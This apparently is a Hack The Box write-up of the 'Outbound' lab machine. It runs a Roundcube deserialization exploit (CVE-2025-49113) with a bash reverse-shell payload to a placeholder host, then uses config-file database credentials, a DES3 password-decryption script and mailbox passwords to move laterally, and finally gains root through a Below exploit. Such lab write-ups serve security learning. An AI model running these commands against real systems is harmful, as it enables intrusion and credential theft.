---
title: "HTB Outbound - pwn"
date: 2025-07-18
categories: ["HackTheBox", "Writeup"]
tags: ["Roundcube", "CVE", "RCE", "Privesc", "First-Blood"]
---

solved at 2025-07-17
## First Things First - Recon Time

started with the usual nmap scan 

```bash
nmap -sV -sC -T4 -Pn 10.10.11.77 -oN nmap_scan
```

got back:

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 
80/tcp open  http    nginx 1.24.0
|_http-title: Did not follow redirect to http://mail.outbound.htb/
```

okay so we got ssh and some web service that redirects to `mail.outbound.htb`. quick hosts file update:

```bash
echo "10.10.11.77 mail.outbound.htb" | sudo tee -a /etc/hosts
```

## Nuclei üî•

before even opening burp i decided to throw nuclei at it :

```bash
nuclei -u http://mail.outbound.htb/
```

AND BOOM:

```
[CVE-2025-49113:version_check] [http] [critical] http://mail.outbound.htb/ ["Roundcube Version: 1.6.10"]
```


I looked it up and CVE-2025-49113 is some post-auth RCE in Roundcube via PHP object deserialization. so we can exploit it as long as we can login 

and guess what? we already have creds! tyler:LhKL1o9Nm3X2

## Getting That Shell üíÄ

i searched " CVE-2025-49113 PoC " and found the exploit on github (thanks hakaioffsec):

```bash
git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit
```

set up my listener on another terminal:

```bash
nc -lvnp 4444
```

fired the exploit:

```bash
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/MY-HTB-IP/4444 0>&1'"
```

```
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

and just like that... **WE'RE IN!** üéØ

```bash
www-data@mail:/$ whoami
www-data
```

## From www-data to Tyler

switched to tyler since we had the password:

```bash
su tyler
# Password: LhKL1o9Nm3X2
```

## Database Hunting üïµÔ∏è

started poking around the roundcube config files:

```bash
cat /var/www/html/roundcube/config/config.inc.php
```

found some juicy stuff:

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

database creds! let's see what's in there:

```bash
mysql -u roundcube -pRCDBPass2025 -e 'USE roundcube; SELECT * FROM users;'
```

found 3 users: jacob, mel, and tyler. but the interesting part was the session table:

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
```

there's this massive base64 blob in the vars column. decoded it and found jacob's encrypted password: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`

## Time to Decrypt üîê

remembered the DES key from earlier. we can write a python script and use it to decrypt the password :

```python
from base64 import b64decode
from Crypto.Cipher import DES3

enc_b64 = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key = b'rcmail-!24ByteDESkey*Str'

data = b64decode(enc_b64)
iv = data[:8]
ciphertext = data[8:]

cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

pad_len = plaintext[-1]
if isinstance(pad_len, str):
    pad_len = ord(pad_len)
plaintext = plaintext[:-pad_len]

print("Decrypted:", plaintext.decode())
```

ran it and got: 
```bash
python decrypt.py
Decrypted: 595mO8DmwGeD
```

```

switched to jacob:

```bash
su jacob
# Password: 595mO8DmwGeD
```

## Reading Jacob's Mail üìß

checked out jacob's mailbox:

```bash
cat ~/mail/INBOX/jacob
```

found two emails. first one from tyler:

```
Subject: Important Update
Password: gY4Wr3a1evp4
```

second one from mel talking about some resource monitoring tool called "Below"

## SSH Time

used the new password to ssh:

```bash
ssh jacob@10.10.11.77
# Password: gY4Wr3a1evp4
```

grabbed the user flag:

```bash
cat ~/user.txt
```

**USER FLAG ACQUIRED!** üö©

## Privesc - The Fun Part

found an exploit.py file in jacob's home directory. looked at it and  found out its an exploit for CVE-2025-27591 targeting the Below monitoring tool.

checked the glibc version:

```bash
ldd --version
# 2.39 - vulnerable!
```

ran the exploit:

```bash
python3 exploit.py
```

```
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Payload appended successfully.
root@outbound:/home/jacob#
```

**NOW WE'RE ROOT!** üî•üî•üî•

```bash
cat /root/root.txt
```

**Machine ROOTED!** üëë

---


honestly this was way easier than i expected.

might do more writeups if people actually read this. next time gonna try a harder machine.

peace out ‚úåÔ∏è

_ps: if you're reading this and i haven't posted anything in months, remind me cuz i probably got distracted by something else lmao_

BTW THIS WILL BE POSTED AFTER THE MACHINE IS RETIRED
